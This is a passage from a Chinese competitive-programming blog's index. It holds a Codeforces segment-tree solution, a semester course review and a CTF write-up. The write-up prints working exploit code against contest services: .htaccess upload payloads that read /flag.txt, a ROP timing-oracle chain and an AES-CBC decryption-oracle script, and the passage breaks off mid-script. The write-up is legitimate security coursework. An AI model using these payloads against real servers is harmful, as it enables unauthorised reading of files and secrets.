玩以及耍廢，感覺有點太混了（？\n","permalink":"https://omeletwithoutegg.github.io/2023/08/15/min-plus-convolution-convex-arbitrary/","tags":["dp-optimization","greedy","adhoc"],"title":"關於凸函數的 (min, +) 捲積"},{"contents":"Codeforces 793 F Julia the snail Description 有 $M$ 個傳送器，第 $i$ 個可以把你從 $l_i$ 傳送到 $r_i$，其中 $l_i, r_i$ 介在 $1, N$ 之間。\n你除了傳送以外的移動方式只有向數線的左邊走（把 $x$ 變小）\n接著有 $Q$ 筆詢問問，每筆詢問給 $x, y$，\n問你從 $x$ 開始走，在不超出 $[x, y]$ 這個區間的前提下可以走最右邊是多右邊。\n$r_i$ 全部相異（雖然我感覺好像沒用）\nSolution 想了很久之後看官解發現是 $\\mathcal{O}(\\sqrt{n})$ 氣死\n留言說有一個 log 的解但他不願透露\n網路上查到很多類似吉如一線段樹的解但我覺得他們都沒什麼說服力\n先從 naive 的想法開始說明。\n這邊的說明都是用左閉右閉的。\n如果把所有被 $[x, y]$ 包含的 $[l_i, r_i]$ 拿出來，那他們會把整個區間分成一些連通塊的感覺。\n具體來說，會有一些分界線 $z$，\n使得我們可以把 $[l_i, r_i]$ 分成兩部分，一部分完全落在 $[x, z]$ 而另一部分完全落在 $[z+1, y]$。\n注意到 $z = y$ 一定是一個合法的分界線（？）\n可以知道從 $x$ 開始走最遠可以走到的境界一定就是最左邊的分界線（一定不可能走超過最左的分界線，而如果把被完全包含的 $[l_i, r_i]$ 拿掉就會剩下 $l_i, r_i$ 一起遞增的一堆區間，並且每個 $l_i$ 都落在前一個區間裡面）\n令人驚訝的是，我們可以直接用線段樹維護區間的最左邊的分界線。\n我們首先離線回答問題，掃描線依序從左界大到小把 $[l_i, r_i]$ 加進資料結構並順便回答詢問，\n每個 $[l_i, r_i]$ 放進去的時候按照右界排序。\n這樣對於一個詢問來說我們就可以詢問資結裡面的一個前綴得到所有完全包含在 $[x, y]$ 裡面的所有 $[l_i, r_i]$。\n對於一堆右界介在 $[L, R]$ 的區間 $[l_i, r_i]$，我們想知道他們造成的最左分界線是哪裡。\n現在我們已經知道右界介在 $[L, M]$ 的一堆區間他們造成的最左分界線 $z_L$，以及右界介在 $[M+1, R]$ 的一堆區間他們造成的最左分界線 $z_R$。另外我們還知道他們各自都還有往左延伸一段到多遠（分別是對應的區間集合中的左界最小值）。\n如果 $z_L$ 有被右界介在 $[M+1, R]$ 的區間的左界蓋到，那表示右界介在 $[L, M]$ 的區間造成的所有分界線都會被這個左界蓋到，也就是說右界介在 $[L, R]$ 的區間構成的最左分界線就是 $z_R$。否則 $z_L$ 沒有被蓋到，他仍然是一個分界線，而且他也一定是最左的分界線。\n感覺畫圖更能理解但我懶得作圖了。\nAC code code 感覺是 0-base 左閉右開但隨便（\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 // An AC a day keeps the doctor away. #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe std::cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) #define orange(args...) danb(#args, args) using std::cerr; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); ((cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ..., (cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename I\u0026gt; void danb(const char *s, I L, I R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) ((void)0) #define orange(...) ((void)0) #endif // local #define all(v) begin(v),end(v) using namespace std; const int inf = 1e9; struct Node { int best_i; int mn; Node() : best_i(inf), mn(inf) {} }; Node operator+(const Node \u0026amp;lhs, const Node \u0026amp;rhs) { Node res; res.mn = min(lhs.mn, rhs.mn); if (lhs.best_i \u0026lt; rhs.mn) { res.best_i = lhs.best_i; } else { res.best_i = rhs.best_i; } return res; } struct Segtree { int n; vector\u0026lt;Node\u0026gt; st; Segtree(int t_n) : n(t_n), st(t_n * 2) { for (int i = 0; i \u0026lt; n; i++) { st[i + n].mn = i; st[i + n].best_i = i; } for (int i = n - 1; i \u0026gt; 0; i--) { st[i] = st[i \u0026lt;\u0026lt; 1] + st[i \u0026lt;\u0026lt; 1 | 1]; } } void modify(int p, Node nd) { p += n; st[p] = nd; while (p \u0026gt;\u0026gt;= 1) { st[p] = st[p \u0026lt;\u0026lt; 1] + st[p \u0026lt;\u0026lt; 1 | 1]; } } Node query(int l, int r) { Node resl, resr; for (l += n, r += n; l \u0026lt; r; l \u0026gt;\u0026gt;= 1, r \u0026gt;\u0026gt;= 1) { if (l \u0026amp; 1) resl = resl + st[l++]; if (r \u0026amp; 1) resr = st[--r] + resr; } return resl + resr; } void dump() { vector\u0026lt;int\u0026gt; s; for (int i = 0; i \u0026lt; n; i++) { s.push_back(st[i + n].mn + 1); } orange(all(s)); } }; signed main() { ios_base::sync_with_stdio(false); cin.tie(nullptr); int n, m; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; seg(n); for (int i = 0; i \u0026lt; m; i++) { int l, r; cin \u0026gt;\u0026gt; l \u0026gt;\u0026gt; r; --l, --r; seg[l].emplace_back(r); } int q; cin \u0026gt;\u0026gt; q; vector\u0026lt;int\u0026gt; ans(q); vector\u0026lt;vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt;\u0026gt; qs(n); for (int i = 0; i \u0026lt; q; i++) { int x, y; cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y; --x, --y; qs[x].emplace_back(y, i); } Segtree sgt(n); // iota for (int i = n - 1; i \u0026gt;= 0; i--) { for (int r: seg[i]) { Node nd; nd.mn = i; nd.best_i = r; sgt.modify(r, nd); } for (auto [r, qid]: qs[i]) { auto ret = sgt.query(i, r + 1); ans[qid] = ret.best_i; } } for (int i = 0; i \u0026lt; q; i++) cout \u0026lt;\u0026lt; ans[i] + 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return 0; } 美如畫。\n暑假太閒太 nerd 跑來更新部落格，最近不知道該怎麼辦才好。\n另外常常感覺自己分享了一些知識之後就不能出題目好麻煩（從來學不會出題目）\n","permalink":"https://omeletwithoutegg.github.io/2023/07/09/cf-793f/","tags":["data-structure","adhoc","cpp","codeforces"],"title":"CF 793f Julia the snail"},{"contents":"Third semester 感覺時間過好快，雖然才第三個學期而已。\n足球初級 修了個體育。\n老師上課的方式是每個禮拜會先教一下子基本動作，然後就讓我們分組比賽。\n分數來源除了考規則、考基本動作以外，還有在比賽中有好表現可以加分。\n分組是期初分完就固定的，但依照我的社恐力和組員相處還是很吃力（？）\n其實每個禮拜跑動一下，結束之後心情還是不錯的（但社交能量會喪失（？））\n預設是在操場上課，有下雨的話會換到舊體。\n因為是在下半年，所以即便是在操場上，大多數時間也不太會熱。\n最後拿到 A，不知道在什麼地方加強有機會拿到 A+。\n系統程式設計 簡稱 SP 的一門大二必修。\n課程內容幾乎都在講 system call 跟 Unix-like 的系統會有的特性。\nsystem call 從例如 open read write 到 fcntl 或 fork 或 mmap 都有講一下怎麼用、怎麼用不好以及怎麼用比較好。\nUnix-like 系統的特性則是比如說 process、thread、signal、file、pipe 好多好多。\n這堂課有四次程式作業還有一些手寫作業，手寫作業在 ChatGPT 出來之後輕鬆很多(X\n程式作業是我覺得很麻煩的地方。\n程式作業的形式是助教會寫一份 spec 然後我們就照著上面的 implement，並且沒有什麼即時反饋的機制，比如說第一次作業是要我們擔任一個借書系統的後端部份（跟網路互動的部份有寫好部份的 code 了），用 open read write 以及一些 IO multiplexing 的 syscall 去同步處理多個 request。\n很煩的部份是，常常在作業出來一陣子之後又更新一些檔案/spec 等等，尤其是 spec 不太清楚還要一直到 github 討論區問助教，第四次作業我覺得甚至你會需要把討論區給全部翻過一遍才能理解 spec 足夠的細節，總之就是很煩。\n(Update: OS 比 SP 煩更多)\n另外作業四次都有大腿抱，好幸運。有一些提早寫完的修課生就會寫一些 testing tool 來幫助其他人檢查他們有沒有寫錯（可能也是順便對自己的作業）。當然不可以抄襲所以常常都只能比對輸出，只是盡量考量各種 edge case 而已。\n我覺得這樣有點考驗臉皮夠不夠厚或是有沒有認識到那些厲害的人，是一個蠻奇怪的現象。\n段考考的題目感覺真的是有夠細，或者應該說我覺得上課教的東西就已經太細了。\n比如說他會考 mmap 好多不同參數的用處，我覺得應該真的很少人會還記得什麼是 MAP_ANONYMOUS 跟 MAP_SHARED。或者他會間接考說 open 的所有可以填的 flag 有哪些，我相信這也不是一個大家都會有自信記得全部的東西（？）\n期中考的時候我是真正的到處蹭，蹭考古題也蹭複習團。\n然後期中就（感覺）考蠻好的。\n期末的時候有點忙，只有在家裡讀（但也有私訊蹭考古題），考了 9X 分感覺不是考特別高，滿分是從 130 分開始算，不過似乎最終算總分的時候是除以 100。總之有 A+ 就沒有太在意了，進入懶惰模式。\n程式結構與設計 ICPC 培訓班。\n即使沒有修的學期也是一直在團練所以這算是個免費學分?!\n自動機與形式語言 大三必修，本來沒有打算要早修的，但選課的時候選進來想說之後退掉就好了，結果錯過可以退選的時機。\n跟承滿姐討論了最後沒有停修。\n除了第一堂課以外就沒有去上課了 zzz\n蹺課只有一次與無數次。\n很好笑的是感覺很多內容都是暑假我們回去教學弟的時候，蕭梓宏負責教的內容。\n成績計算總共只有期中期末各兩次的作業與段考。\n老師的上課資料有投影片與筆記，其中筆記是比較嚴謹的版本的。教材蠻不錯的，作業寫起來也不算太難，段考我則是因為有點怕考出以前考過或者類似的難題，有找認識的人一起討論考古題，期中我們有試寫一份不過期末就只有在考前的週末討論跟複習了。期中考完的時候我想說很穩，結果拿回來改完的作業跟考卷都錯了基本題的分，搞得我寫期末作業跟段考有點害怕，不過最後還是幸運有拿到 A+。\n從去國外的同學聽起來他們教的東西都要比較深一點，這門課感覺真的沒有教太多東西的感覺，也沒有聽到我期待的最小DFA（之前ICPC團練碰到）。\n歐洲啟蒙運動中的政治與社會性 課名裡面都寫著歐洲啟蒙運動了，我原本以為會是有一點歷史課的元素在。\n不過這門課感覺基本上都是在討論政治與社會。\n一開始先講為什麼國家要存在，從亞里斯多德的觀點到 Thomas Hobbes 的觀點，接著再提一些我們現在認為的普世價值，用不同的社會學家的觀點去引導我們思考為什麼要有法律、為什麼要有政府、政府施政的合法性來源是什麼等等。\n讓我想繼續修下去的原因是因為感覺像為什麼國家擁有權力或是為什麼要有國家這件事有種所有公民都該知道的感覺（但後面不認真上課 bad）\n另外老師的英文很英國，而我英文聽力又很爛，所以常常沒跟好就整個不知道在講什麼了（？）像第一堂在講 Hobbes 這個人名我直到投影片放出來才意識到他在講這個。\n成績來源是兩篇 essay，就是要針對他提供的問題清單去寫一份報告，期中期末總共選三個問題。我覺得我超爛，然後拿了 A- 不是很意外。\n期中出了一個很白痴的包，就是我是用英文寫 essay 然後裡面有中文字，結果轉 PDF 的時候只剩下那串中文字我也沒發現，導致我上傳了一個只有「中國十四億人民的意志」的 PDF，幸好老師最後讓我補交。\n複分析導論 感覺起來跟我高中旁聽的線性代數調性差不多，就是很細的把課本每個 theorem 的證明和舉例都解釋一遍，然後老師賣力的在黑板上面寫板書這樣子。\n雖然都寫在課本上了但我還是有努力用 hackmd 抄筆記，雖然到最後還是沒有把每堂課筆記都做完qq\n因為不是數學系榮譽學程（我也不敢修XD），所以作業和考試的難度沒有太高（學期後半有點變難，有一個比較抽象在講無限維的收斂的章節我有些題目沒有寫出，不過作業分數好像是十次作業取九次最好的之類的，所以我就沒有在意）\n有趣的公式：Cauchy Integral Formula、Residue Theorem、Maximum Modulus Theorem、Hadamard Three Circle Theorem、Riemann Mapping Theorem\n我曾經期待可以把這門課的東西用在計算幾何上但好像用不到XD\n甚至有一次 ICPC 考了 Mobius transform 保交比但那是在上這門課之前遇到的\n計算機安全 基本上就是一門 CTF 的課。\n整個學期分成四個部份，這學年按照順序是上 crypto、reverse、pwn、web。\n我覺得 reverse 和 pwn 比較難，尤其 reverse 比較不有趣，但也可能只是因為我學期中太忙了\n分數是有四次要寫 writeup 的作業，一個 extra-CTF 還有一個期末考的 CTF（EOF 初賽）。\ncrypto 的課感覺有點貪心，想要在三堂課從無基礎講凱薩加密上到很多的 RSA、AES、橢圓曲線，講師看起來蠻趕的。\nreverse 和 pwn 我就都沒去上課，reverse 就是一直打開 IDA 然後反編譯再 trace 醜醜 code，\n而 pwn 就是要懂 linux 的 stack/heap 記憶體 allocation 還有一些 calling convention，例如 syscall 的參數會放在哪些 register 或記憶體，還有 glibc 在 malloc 跟 free 會有一些 bin 之類的，常常要一直看 gdb，不過還算是有趣。\nweb 是最後一個主題，我覺得算有趣（也可能是我比較多時間）\nweb 感覺就是有很多隱形的先備知識，因為網頁的框架和程式語言實在是太多了，如果題目不給提示實在是很難猜出背後的梗是什麼。\nFinal CTF 是 EOF quals，crypto 的梗幾乎都一樣所以就水掉了，進去決賽之後也去打了現場賽，第一次玩到 KoH 和 A\u0026amp;D，好難又好難。\n下面不是有修的課但是我也想寫進來（？）\nADA 助教 第一次當助教，蠻可怕的，就是大家題目都出好難，如果我沒有好好看當週的題目或簡報很容易就在 TA hour 被問倒。\n改考卷有夠難，我如果沒有事先看過全部人的作答很難事先訂出一個評分標準，另外要細看一些解釋也很麻煩，幸好我改的題目大部分都是一眼看出他有沒有在 chatgpt（aka 唬爛）。\n然後 ADA 助教也是一個出題壓力，不過我也沒有在 ADA 出什麼厲害的題目所以好像也不值得說嘴。\n會想要當助教主要是為了想要當作體驗一下當助教的感覺，現在感覺助教真的蠻辛苦的所以我現在在 ML 吵分都很有罪惡感（但題目出得不清楚還是繼續嘴）\n大二下有 DSA 但因為我覺得大二下想要比大二上少一點 load 所以我沒有去接助教，結果好像還是一樣搞得自己很忙。\nNPSC 隱形的出題壓力，而且裁判必須要保密身份，但我又是最不會狼人殺的人，其他裁判似乎都很享受假裝不是裁判XD\n全國模擬賽系統組（？） 去年當過一次了，今年是再做一次一樣的事情順便傳承給學弟。\n結果中途不小心忘記關機器放在那邊不用浪費幾千元XD 良心預算比賽承受不起，真的很感謝我用客服溝通後 AWS 他們就勾銷了這筆\nNASA 二階 這個我好混，總之就是會選組然後介紹一些該組要做的事情以及丟一些作業。\nend 這學期（第三學期）真的是不小心太貪心接太多東西+選太多課了導致很累。\n另外雖然網站名稱叫做競程隨筆但好像第一頁都沒有競程了被人吐槽，該怎麼辦才好（\n我甚至還想寫一個推薦 wezterm 的東西，so nerd\n前面有許多內容都是大二下學期初寫的，寫到一半就開始很忙所以又擱置到現在（學期後半）才繼續寫。\n至少努力繼續更新一篇才會有機會更新更多篇。\n另外這學期有很多系統組類別的事情，我總感覺現在在維護這些東西的原則就是要不怕髒而且不要怕寫出垃圾 code，果然還是沒有勇氣去把陳年舊噁 code 翻新。\n","permalink":"https://omeletwithoutegg.github.io/2023/01/15/csie-3rd-sem/","tags":["CSIE","experience"],"title":"第三學期修課心得"},{"contents":"2023 EOF CTF 初賽 修了計算機安全，然後期末考似乎是參加 EOF CTF 的初賽，另外還要交 writeup。\n把我寫的部份放在我的 blog 上水文章（？）\n下一篇文章希望是大二上的修課心得，再不寫就要忘光了。\nWeb Gist problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php if(isset($_FILES[\u0026#39;file\u0026#39;])){ $file = $_FILES[\u0026#39;file\u0026#39;]; if( preg_match(\u0026#39;/ph/i\u0026#39;, $file[\u0026#39;name\u0026#39;]) !== 0 || preg_match(\u0026#39;/ph/i\u0026#39;, file_get_contents($file[\u0026#39;tmp_name\u0026#39;])) !== 0 || $file[\u0026#39;size\u0026#39;] \u0026gt; 0x100 ){ die(\u0026#34;Bad file!\u0026#34;); } $uploadpath = \u0026#39;upload/\u0026#39;.md5_file($file[\u0026#39;tmp_name\u0026#39;]).\u0026#39;/\u0026#39;; @mkdir($uploadpath); move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $uploadpath.$file[\u0026#39;name\u0026#39;]); Header(\u0026#34;Location: \u0026#34;.$uploadpath.$file[\u0026#39;name\u0026#39;]); die(\u0026#34;Upload success!\u0026#34;); } highlight_file(__FILE__); ?\u0026gt; \u0026lt;form method=POST enctype=multipart/form-data\u0026gt; \u0026lt;input type=file name=file\u0026gt; \u0026lt;input type=submit value=Upload\u0026gt; \u0026lt;/form\u0026gt; 題目是有一個簡單的 php 網站可以上傳任意檔案，只要檔名和內容不包含 ph 就可以上傳，會被放到 /var/www/html/upload/{somerandomstring}/ 裡面（可以用 /upload/{somerandomstring}/ 去 access 該資料夾）。\n首先第一步就是看背後的 HTTP 伺服器是誰，隨便戳個 404 可以得知是 Apache，那就聯想到 .htaccess，去 google 之後得知可以用 \u0026lt;If file(xxx)\u0026gt; 來得知檔案內容。\nhttps://blog.csdn.net/solitudi/article/details/116666720\n我一開始用的 payload 是\n1 2 3 \u0026lt;If \u0026#34;file(\u0026#39;/flag.txt\u0026#39;) \u0026lt; \u0026#39;flag{ABCD\u0026#39;\u0026#34;\u0026gt; ErrorDocument 404 \u0026#34;leq\u0026#34; \u0026lt;/If\u0026gt; 不過因為 escape char 的問題只偷得到部份的 flag，把單引號跟雙引號都 escape 掉之後還是有一部分偷不到，不知道怎麼解決，最後是翻到有一個 base64 function 就把 payload 改成\n1 2 3 \u0026lt;If \u0026#34;base64(file(\u0026#39;/flag.txt\u0026#39;)) \u0026lt; \u0026#39;RkxBR3tXa\u0026#39;\u0026#34;\u0026gt; ErrorDocument 404 \u0026#34;leq\u0026#34; \u0026lt;/If\u0026gt; 最後的 script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 import requests from bs4 import BeautifulSoup from tqdm import tqdm from base64 import b64decode # https://httpd.apache.org/docs/2.4/expr.html # https://stackoverflow.com/questions/22567306/how-to-upload-file-with-python-requests url = \u0026#39;https://gist.ctf.zoolab.org/\u0026#39; def upload(payload): with open(\u0026#39;.htaccess\u0026#39;, \u0026#39;wb\u0026#39;) as file: file.write(payload.encode()) with open(\u0026#39;.htaccess\u0026#39;, \u0026#39;rb\u0026#39;) as file: res = requests.post(url, files={\u0026#39;file\u0026#39;: file}) # soup = BeautifulSoup(res.text, feature=\u0026#34;lxml\u0026#34;) path = res.url path = path[:path.rfind(\u0026#39;/\u0026#39;) + 1] return path # \u0026lt;If \u0026#34;file(\u0026#39;/flag.txt\u0026#39;) =~ m#flag{a#i\u0026#34;\u0026gt; def ask_leq(s): s = s.replace(\u0026#39;\\\\\u0026#39;, \u0026#39;\\\\\\\\\u0026#39;) s = s.replace(\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\\\\\\\u0026#39;\u0026#39;) s = s.replace(\u0026#39;\\\\\u0026#39;, \u0026#39;\\\\\\\\\u0026#39;) s = s.replace(\u0026#39;\u0026#34;\u0026#39;, \u0026#39;\\\\\u0026#34;\u0026#39;) # print(s) payload = f\u0026#39;\u0026#39;\u0026#39;\u0026lt;If \u0026#34;base64(file(\u0026#39;/flag.txt\u0026#39;)) \u0026lt; \u0026#39;{s}\u0026#39;\u0026#34;\u0026gt; ErrorDocument 404 \u0026#34;leq {s[-1]}\u0026#34; \u0026lt;/If\u0026gt;\u0026#39;\u0026#39;\u0026#39; path = upload(payload) res = requests.get(path + \u0026#39;something404\u0026#39;) leq = \u0026#39;leq\u0026#39; in res.text # assert \u0026#39;500 Internal Server Error\u0026#39; not in res.text return leq def ask_size_leq(n): payload = f\u0026#39;\u0026#39;\u0026#39;\u0026lt;If \u0026#34;filesize(\u0026#39;/flag.txt\u0026#39;) -le {n}\u0026#34;\u0026gt; ErrorDocument 404 \u0026#34;leq {n}\u0026#34; \u0026lt;/If\u0026gt;\u0026#39;\u0026#39;\u0026#39; path = upload(payload) res = requests.get(path + \u0026#39;something404\u0026#39;) leq = \u0026#39;leq\u0026#39; in res.text assert \u0026#39;500 Internal Server Error\u0026#39; not in res.text return leq # prefix = \u0026#39;FLAG{Wh4t_1f_th3_WAF_b3c0m3_preg_match(\u0026#39; # prefix = \u0026#39;\u0026#39;\u0026#39;FLAG{Wh4t_1f_th3_WAF_b3c0m3_preg_match(\u0026#39;/h/i\u0026#39;,file_get_contents\u0026#39;\u0026#39;\u0026#39; # prefix = \u0026#39;\u0026#39;\u0026#39;FLAG{Wh4t_1f_th3_WAF_b3c0m3_preg_match(\u0026#39;/h/i\u0026#39;,file_get_contents($file[\u0026#39;tmp_name\u0026#39;])\u0026#39;\u0026#39;\u0026#39; # print(len(prefix)) prefix = \u0026#39;\u0026#39; # prefix = \u0026#39;RkxBR3tXaDR0XzFmX3RoM19XQUZfYjNjMG0zX3ByZWdfbWF0Y2goJy9oL2knLGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlWyd0bXBfbmFtZSddKSkhPT0w\u0026#39; for i in range(89 // 3 * 4): L = 32 R = 127 while R - L \u0026gt; 1: M = (R + L) // 2 if ask_leq(prefix + chr(M)): R = M else: L = M prefix += chr(L) print(L, prefix) if len(prefix) % 4 == 0: print(b64decode(prefix.encode())) 後來得知這題其實很簡單就可以拿到 flag 了…\n1 2 # .htaccess ErrorDocument 403 %{file:/flag.txt} pwn how2know_revenge 原題的 source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;seccomp.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; static char flag[0x30]; int main() { char addr[0x10]; int fd; scmp_filter_ctx ctx; fd = open(\u0026#34;/home/chal/flag\u0026#34;, O_RDONLY); if (fd == -1) perror(\u0026#34;open\u0026#34;), exit(1); read(fd, flag, 0x30); close(fd); write(1, \u0026#34;talk is cheap, show me the rop\\n\u0026#34;, 31); read(0, addr, 0x1000); ctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); seccomp_load(ctx); seccomp_release(ctx); return 0; } 跟作業一樣被禁用了幾乎所有 syscall。\n作業的 how2know 是用 infinite loop 讓我們可以每次分辨出一個 bit，這題只差在說作業會執行我們自己寫的 shell code 而這題只有 buffer overflow，而且有開 NX。不過是 static linked 所以 ROP gadget 和 main/flag 的 address 都直接抓得到。\n剩下來的問題就是用 ROP chain 寫一個 while loop 還有 conditional jmp 了。\n註：得到 ROP address 可以用 pwntools 附的 ROPgadget 這個指令\n1 ROPgadget --multibr --binary share/chal | fzf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 from pwn import * import func_timeout context.arch = \u0026#39;amd64\u0026#39; context.terminal = [\u0026#39;wezterm\u0026#39;, \u0026#39;start\u0026#39;] context.log_level = \u0026#39;error\u0026#39; # r = gdb.debug(\u0026#39;share/chal\u0026#39;, \u0026#39;break main\u0026#39;) # r = process(\u0026#39;share/chal\u0026#39;) #, aslr=False) # gdb.attach(r) main_addr = 0x401cb5 flag_addr = 0x4de2e0 pop_rax_ret = 0x0000000000458237 # : pop rax ; ret pop_rsi_ret = 0x0000000000402798 # : pop rsi ; ret pop_rdi_ret = 0x0000000000401812 # : pop rdi ; ret pop_rdx_ret = 0x000000000040171f # : pop rdx ; ret push_rsi_ret = 0x0000000000412b46 # : push rsi ; ret def gogo(N, OFFSET): r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10012) # r = process(\u0026#39;share/chal\u0026#39;) ROP = flat( pop_rdx_ret, N, pop_rax_ret, flag_addr + OFFSET, 0x0000000000438c36, # : cmp byte ptr [rax], dl ; ret 0x0000000000493f6e, # : jle 0x494010 ; ret # 0x000000000048d0df, # : cmp rax, -3 ; jbe 0x48d0f0 ; ret # 0x0000000000402ed9, # : cmp eax, 0xd922a ; ret # infinite loop pop_rsi_ret, push_rsi_ret, push_rsi_ret, ) # print(len(ROP)) payload = cyclic(0x28) + ROP r.send(payload) @func_timeout.func_set_timeout(0.5) def wait(): r.recvall() try: wait() except func_timeout.exceptions.FunctionTimedOut: return False return True # print(gogo(ord(\u0026#39;F\u0026#39;), 0)) # print(gogo(ord(\u0026#39;F\u0026#39;) - 1, 0)) # print(gogo(ord(\u0026#39;L\u0026#39;), 1)) # print(gogo(ord(\u0026#39;L\u0026#39;) - 1, 1)) ans = \u0026#39;\u0026#39; for i in range(50): L = 32 R = 127 while R - L \u0026gt; 1: M = (L + R) // 2 if gogo(M, i): R = M else: L = M ans += chr(R) print(ans) crypto HEX 題目\n一開始會生成 一個 8 byte 的 token 以及各 16 byte 的 iv、key，並且給我們用 AES CBC 加密 token.hex() 過後的結果。\n猜中這個 token 就可以得到 flag。\n我們可以詢問多次用「任意 iv」和原本的 key 解密「任意訊息」，並且得知這個訊息是不是一個 hex string，但要注意如果沒辦法從 bytes decode 回 str 就會直接斷線。\nerror-based 的 bit-flipping attack 的感覺。根據 AES CBC 的特性，對 iv 的一個 byte xor 某個值等於對解密過後對應的 byte xor 那個值（iv 只會影響第一個 block，每個 block 應該是 16 bytes），所以我們就試著看 token.hex() 的特定一個字元 XOR 哪些數字還會是 [0-9A-Fa-f]。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 # localtest.py from Crypto.Cipher import AES from hashlib import sha256 import os FLAG = b\u0026#39;FLAG{adnajdlkawjlefjle}\u0026#39; token = os.urandom(8) iv = os.urandom(16) key = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv=iv) print(iv.hex() + cipher.encrypt(token.hex().encode()).hex()) print(\u0026#34;Hint: \u0026#34;, sha256(token).hexdigest()) cipher = AES.new(key, AES.MODE_CBC, iv=iv) ct = cipher.encrypt(token.hex().encode()) print(iv, ct) cipher = AES.new(key, AES.MODE_CBC, iv=iv) m = cipher.decrypt(ct).decode() print(m) goodchr = \u0026#39;1234567890abcdefABCDEF\u0026#39; mp = {} for c in goodchr: mp[ str(sorted([ord(c) ^ ord(d) for d in goodchr])) ] = c an = \u0026#39;\u0026#39; for j in reversed(range(16)): possible = [] for c in range(128): inp = iv[:j] + bytes([c ^ iv[j]]) + iv[j+1:] + ct # ct[:14] + bytes([c, d]) + suffix cipher = AES.new(key, AES.MODE_CBC, iv=inp[:16]) m = cipher.decrypt(inp[16:]) m = m.decode() try: # orgm = m m = bytes.fromhex(m) print(\u0026#34;Well received\u0026#34;) # print(orgm[-1]) possible.append(c) except: print(\u0026#34;Invalid\u0026#34;) c = mp[str(possible)] an += c print(c) print(\u0026#39;\u0026#39;.join(list(reversed(an)))) exit(0) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 # solve.py from pwn import * from tqdm import tqdm # context.log_level = \u0026#39;debug\u0026#39; # r = process([\u0026#39;python\u0026#39;, \u0026#39;./chal.py\u0026#39;]) r = remote(\u0026#39;eof.ais3.org\u0026#39;, 10050) goodchr = \u0026#39;1234567890abcdefABCDEF\u0026#39; mp = {} for c in goodchr: mp[ str(sorted([ord(c) ^ ord(d) for d in goodchr])) ] = c L = r.recvline() print(L) inp = bytes.fromhex(L.strip().decode()) print(r.recvline()) iv, ct = inp[:16], inp[16:] print(iv, ct) def ask(msg): r.recvline() r.recvline() r.recvline() r.sendline(b\u0026#39;1\u0026#39;) r.sendafter(b\u0026#39;Message(hex): \u0026#39;, bytes(msg.hex() + \u0026#39;\\n\u0026#39;, \u0026#39;ascii\u0026#39;)) return b\u0026#39;Well\u0026#39; in r.recvline() ans = \u0026#39;\u0026#39; for j in tqdm(range(16)): possible = [] for c in range(128): inp = iv[:j] + 